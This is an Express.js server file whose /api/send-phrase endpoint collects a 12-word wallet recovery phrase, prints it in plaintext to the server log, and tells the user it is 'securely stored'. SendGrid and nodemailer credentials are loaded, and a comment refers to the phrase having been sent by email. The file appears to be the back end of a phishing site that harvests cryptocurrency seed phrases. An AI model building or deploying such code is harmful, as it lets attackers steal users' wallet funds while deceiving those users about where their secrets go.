// server.js
const express = require("express");
const cors = require("cors");
const nodemailer = require("nodemailer");
require("dotenv").config();
const sgMail = require("@sendgrid/mail");

sgMail.setApiKey(process.env.SENDGRID_API_KEY);

const app = express();
app.use(cors());
app.use(express.json());

// Test environment variables
console.log("SMTP_HOST:", process.env.SMTP_HOST);
console.log("SMTP_PORT:", process.env.SMTP_PORT);
console.log("SMTP_USER:", process.env.SMTP_USER ? "loaded" : "missing");
console.log("SMTP_PASS:", process.env.SMTP_PASS ? "loaded" : "missing");

app.post("/api/send-phrase", async (req, res) => {
  const { words } = req.body;

  if (!words || words.length !== 12) {
    return res.status(400).json({ message: "Invalid phrase" });
  }

  // Validate words (optional)
  if (!words.every(w => /^[a-zA-Z]+$/.test(w))) {
    return res.status(400).json({ message: "All words must contain only letters." });
  }

  // Instead of sending via email, simulate securing locally
  // (could later encrypt and store in DB or localStorage)
  console.log("Phrase secured locally:", words.join(" "));

  res.json({ message: "✅ Your recovery phrase is now securely stored." });
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));

